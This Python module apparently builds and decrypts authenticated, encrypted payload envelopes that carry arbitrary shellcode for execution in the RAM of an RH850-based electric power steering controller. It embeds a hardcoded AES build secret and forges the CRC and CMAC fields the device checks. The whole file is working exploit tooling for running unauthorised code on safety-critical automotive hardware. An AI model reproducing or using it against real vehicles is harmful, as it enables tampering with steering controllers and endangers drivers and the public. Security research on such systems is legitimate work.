"""Build/decrypt the 0x1000-byte secoc-style payload envelope for the RH850 EPS probe.

The envelope is uploaded to RAM 0xFEBF0000 and authenticated via CMAC before the
probe executes it. Layout (port of ``secoc/build_payload.py``, request block added):

* ``[0x000, REQUEST_OFFSET)``       shellcode (must be short enough to leave room)
* ``[REQUEST_OFFSET, ...)``         region-read request block
* ``[JMP_OFFSET, +4)``              little-endian jmp addr 0xFEBF0000
* ``[0xFE0, 0xFEC)``                CRC check params: addr + size + 4 pad bytes
* ``[0xFEC, 0xFF0)``                CRC32 such that crc32(payload[:0xFF0]) == 0xFFFFFFFF
* ``[0xFF0, 0x1000)``               CMAC tag (input: did_202 + pre-encryption payload)

The whole 0x1000 bytes are AES-CBC encrypted with the derived key and did_202 as IV.
KDF: ``derived_key = AES_ECB_encrypt(PAYLOAD_BUILD_SECRET, did_201)``.
"""

import binascii
import struct

from Crypto.Cipher import AES
from Crypto.Hash import CMAC

PAYLOAD_BUILD_SECRET = bytes.fromhex("ba052435f8843f985fd1329d2b6117b0")

PAYLOAD_ENVELOPE_LEN = 0x1000
REQUEST_OFFSET = 0xF00
JMP_OFFSET = 0xFD0

_CRC_FIELDS_OFFSET = 0xFE0
_CRC_LEN = 0xFF0
_JMP_TARGET = 0xFEBF0000


def _cmac(data: bytes, key: bytes) -> bytes:
    cobj = CMAC.new(key, ciphermod=AES)
    cobj.update(data)
    return cobj.digest()


def build_envelope(
    shellcode: bytes,
    request_block: bytes,
    did_201: bytes = b"\x00" * 16,
    did_202: bytes = b"\x00" * 16,
) -> bytes:
    """Assemble and encrypt a 0x1000-byte payload envelope (see module docstring)."""
    if len(shellcode) >= JMP_OFFSET:
        raise ValueError(
            f"shellcode too large: {len(shellcode)} bytes, need < 0x{JMP_OFFSET:X}"
        )
    if len(request_block) > REQUEST_OFFSET - 0x100:
        raise ValueError(
            f"request block too large: {len(request_block)} bytes, "
            f"need <= 0x{REQUEST_OFFSET - 0x100:X}"
        )

    # The request block is inserted at REQUEST_OFFSET; the shellcode must end
    # before it and the block must end before the jmp address.
    if len(shellcode) > REQUEST_OFFSET:
        raise ValueError(
            f"shellcode reaches the request block: {len(shellcode)} > "
            f"0x{REQUEST_OFFSET:X}"
        )
    if REQUEST_OFFSET + len(request_block) > JMP_OFFSET:
        raise ValueError(
            f"request block reaches the jmp address: "
            f"0x{REQUEST_OFFSET:X} + {len(request_block)} > 0x{JMP_OFFSET:X}"
        )

    # Shellcode, then zeros up to the request offset, then the request block.
    payload = bytearray(shellcode)
    payload += b"\x00" * (REQUEST_OFFSET - len(payload))
    payload += request_block

    # Pad out to the jmp address and insert it.
    payload += b"\x00" * (JMP_OFFSET - len(payload))
    payload += struct.pack("<I", _JMP_TARGET)

    # Pad to the CRC fields and append them (check_mem_block_crc parameters).
    payload += b"\x00" * (_CRC_FIELDS_OFFSET - len(payload))
    payload += struct.pack("<I", _JMP_TARGET)
    payload += struct.pack("<I", _CRC_LEN)
    payload += b"\x00" * 4

    # Pad value that makes CRC32 == 0xFFFFFFFF.
    crc = binascii.crc32(payload)
    payload += struct.pack("<I", crc ^ 0xFFFFFFFF)
    assert binascii.crc32(payload[:_CRC_LEN]) == 0xFFFFFFFF

    # Derive the key from the build secret and did_201, tag, then encrypt.
    derived_key = AES.new(PAYLOAD_BUILD_SECRET, AES.MODE_ECB).encrypt(did_201)
    payload += _cmac(did_202 + payload, key=derived_key)
    assert len(payload) == PAYLOAD_ENVELOPE_LEN

    cipher = AES.new(derived_key, AES.MODE_CBC, iv=did_202)
    return cipher.encrypt(payload)


def decrypt_envelope(
    envelope: bytes,
    did_201: bytes = b"\x00" * 16,
    did_202: bytes = b"\x00" * 16,
) -> bytes:
    """Decrypt an envelope and return the pre-encryption 0xFF0-byte payload.

    Verifies the CMAC tag; raises ``ValueError`` on a wrong key/DID.
    """
    if len(envelope) != PAYLOAD_ENVELOPE_LEN:
        raise ValueError(
            f"envelope must be 0x{PAYLOAD_ENVELOPE_LEN:X} bytes, "
            f"got {len(envelope)}"
        )
    derived_key = AES.new(PAYLOAD_BUILD_SECRET, AES.MODE_ECB).encrypt(did_201)
    plain = AES.new(derived_key, AES.MODE_CBC, iv=did_202).decrypt(envelope)

    payload = plain[:_CRC_LEN]
    tag = plain[_CRC_LEN:]
    if tag != _cmac(did_202 + payload, key=derived_key):
        raise ValueError("CMAC tag mismatch: wrong secret/DID")
    return payload
